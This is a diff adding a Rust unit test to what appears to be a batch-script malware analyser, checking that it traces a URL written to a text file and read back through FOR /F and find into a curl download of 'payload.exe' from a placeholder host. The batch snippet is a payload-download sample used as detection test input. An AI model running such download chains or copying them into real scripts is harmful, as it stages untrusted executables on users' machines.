@@ -3676,6 +3676,29 @@ for /f "tokens=* delims=" %%U in ('find "https://" first.txt second.txt') do cur
     }
 
     #[test]
+    fn for_f_find_wildcard_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-find-wildcard.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('find "https://" *.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-find-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F find wildcard source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_findstr_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>web.txt
